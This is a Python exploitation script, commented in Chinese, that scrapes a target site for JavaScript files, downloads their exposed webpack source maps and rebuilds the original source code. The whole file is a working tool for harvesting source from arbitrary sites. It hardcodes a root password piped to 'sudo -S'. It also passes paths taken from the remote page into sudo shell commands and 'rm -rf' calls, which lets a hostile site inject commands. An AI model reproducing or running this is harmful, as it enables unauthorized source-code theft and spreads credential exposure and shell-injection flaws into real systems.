import re
import subprocess
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import numpy as np


print('--------------------webpack源码泄露漏洞利用脚本(Linux)--------------------')
print('PS:脚本唯一需要修改的地方是password值，改为自己root的密码')
print('PS:安装必要工具reverse-sourcemap语句：npm install --global reverse-sourcemap')
print('PS:输入的网站不要带后面路径，只输入https://xx.xx/')
"""
Created on 2021.9.18

@author: yuchi
"""

password = "yuchi" #--------------------------root的密码----------------------------

def webpack():
    try:
        result_curl = []
        result_reverse_sourcemap = []
        error_cs = 0
        for jslist in getlist:
            print(jslist)
            js_all = jslist.split('/')
            js_name = js_all[-1]
            #print(js_name)
            js_name_all = js_name.split('.')
            js = js_name_all[0]+'_'+js_name_all[1]
            #print(js)
            curl = "curl -O {}.map".format(jslist)
            command = "sudo reverse-sourcemap --output-dir ./{} {}.map".format(js,js_name)
            #subprocess.getstatusoutput返回值：返回是一个元组，如果成功，返回(0, 'xxx')；如果失败，返回(1, 'xxx')
            result1 = subprocess.getstatusoutput('echo %s | sudo -S %s' % (password, curl))
            result_curl.append(result1[0])
            if result1[0] == 0:                
                result2 = subprocess.getstatusoutput('echo %s | sudo -S %s' % (password, command))
                result_reverse_sourcemap.append(result2[0])
                if result2[0] == 1:
                    #print('reverse-sourcemap解析失败')
                    error_cs+=1 #工具解析失败次数+1
                    RM = subprocess.getstatusoutput('echo %s | rm -rf ./%s' % (password, js)) #删除无法解析的文件
            else:
                RM = subprocess.getstatusoutput('echo %s | rm -rf ./%s.map' % (password, js_name)) #删除无法解析的文件
        #print(result_curl,result_reverse_sourcemap)
        s_curl = np.isin(result_curl, [0]).all()
        s_reverse_sourcemap = np.isin(result_reverse_sourcemap, [0]).all()
        #print(result_curl,result_reverse_sourcemap)
        if s_curl == True:
            print('源码下载成功---存在{}个js源码，成功下载{}个js源码'.format(len(getlist),len(getlist)))
        else:
            sz_cs = 0
            for sz in result_curl:
                if sz == 0:
                    sz_cs+=1
            print('源码下载失败---存在{}个js源码，成功下载{}个js源码'.format(len(getlist),sz_cs))
        if s_reverse_sourcemap == True:
            print('result:---存在漏洞---存在{}个js源码，共解析出{}个js源码'.format(len(getlist),len(getlist)))
        else:
            if 0 in result_reverse_sourcemap:
                print('result:---可能存在漏洞---存在{}个js源码，共解析出{}个js源码'.format(len(getlist),len(getlist)-error_cs))
            else:
                print('result:---不存在漏洞---')
    except:
        print('程序出错')

def findjs(url):
    if url[-1] != '/':
        url = url + '/'
    else:
        pass
    global getlist
    getlist = []
    houzuilist = ['.js']
    headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        r = requests.get(url,headers=headers,timeout=10,verify=False)
        if r.status_code == 200:
            rt = r.text
        else:
            print("网站有误")
            return
        rt = rt.split('>')
        for line in rt:
            for houzui in houzuilist:
                if houzui in line:
                    if len(line) > 2000:  #限制长度，排查静态源码
                        pass
                    else:
                        tp = re.findall('\"(.*){}'.format(houzui),line)
                        hz = houzui
                        tp = tp[0] + hz
                        if tp[0] == '/':
                            tp = tp[1:]
                        #print(tp)
                        if 'http' not in tp:
                            if '\"' in tp:
                                tp = tp.split('\"')
                                for tp1 in tp:
                                    if hz not in tp1:
                                        pass
                                    else:
                                        tp = re.findall('(.*){}'.format(hz),tp1)
                                        tp = url + tp[0] + hz
                                        getlist.append(tp)
                            else:
                                tp = tp.replace('./','/')
                                tp = url + tp
                                getlist.append(tp)
                        else:
                            tp = re.findall('http(.*)',tp)
                            tp = 'http'+tp[0]
                            getlist.append(tp)
                else:
                    pass
        #print(getlist)
        webpack()
    except:
        print('-------网站输入有误，已退出-------')


url = input("请输入目标网址,如(https://www.baidu.com/):")
if url == '':
    print('-------------退出-------------')
else:
    findjs(url)